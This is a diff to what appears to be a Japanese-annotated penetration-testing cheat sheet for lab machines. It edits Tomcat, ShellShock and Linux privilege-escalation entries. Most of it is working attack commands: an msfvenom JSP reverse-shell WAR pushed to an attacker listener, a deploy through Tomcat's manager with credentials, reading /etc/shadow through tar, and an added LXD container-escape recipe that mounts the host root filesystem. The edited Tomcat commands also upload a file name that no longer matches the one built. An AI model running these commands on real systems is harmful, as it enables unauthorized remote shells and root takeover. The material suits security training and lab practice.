@@ -640,23 +640,19 @@ Response.write("</pre><!-"&"-") %>
 ```
 
 ### Tomcat
-#### reverse shell
+#### RCE
 ```
 /usr/share/tomcat9/etc/tomcat-users.xml
 ```
 ```
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 -f war -o payload.war
-
-curl --user 'tomcat':'$3cureP4s5w0rd123!' --upload-file payload.war "http://10.10.10.1/manager/text/deploy?path=/myapp"
-
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 -f war -o shell.war
+curl --user 'tomcat':'$3cureP4s5w0rd123!' --upload-file payload.war "http://10.10.10.1:8080/manager/text/deploy?path=/shell"
 nc -lvnp 443
-
-curl --user 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/myapp/
+curl --user 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.1:8080/shell/
 ```
 
 #### Tomcat Default PasswdList
 https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
-
 ```
 #!/usr/bin/env python3
 import sys
@@ -675,7 +671,7 @@ with open('tomcat-betterdefaultpasslist.txt') as f:
 ログインに成功したら、msfvenomでwarファイルのペイロードを作成して、アップロードすることでreverse shellを取得。
 
 ### ShellShock(CVE-2014-6271)
-CGIに使用される拡張子を指定して、feroxbusteerなどをかける。  
+CGIに使用される拡張子を指定して、feroxbusterなどをかける。  
 CGIスクリプトに使用される言語がbashであればそのまま悪用可能であり、PerlやPythonなどの場合でもsystem関数などが使用されていれば悪用される可能性がある。
 ```
 feroxbuster -u http://10.10.10.56/cgi-bin/ -x cgi,sh,pl,py,php
@@ -2257,6 +2253,28 @@ perl:
 ./tar cvf shadow.tar /etc/shadow
 ./tar -xvf shadow.tar
 cat etc/shadow
+```
+
+### Lxd Privilege Escalation
+idコマンドでlxdグループに所属しているユーザの場合、権限昇格できる可能性がある。
+```
+# Attacker
+git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder
+sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
+sudo ./build-alpine
+```
+```
+# Target
+lxc image import ./alpine*.tar.gz --alias myimage
+lxd init #全てEnterでok
+lxc init myimage mycontainer -c security.privileged=true
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+
+cd /mnt/root/root
 ```
 
 ## Passwords & Keys - History Files
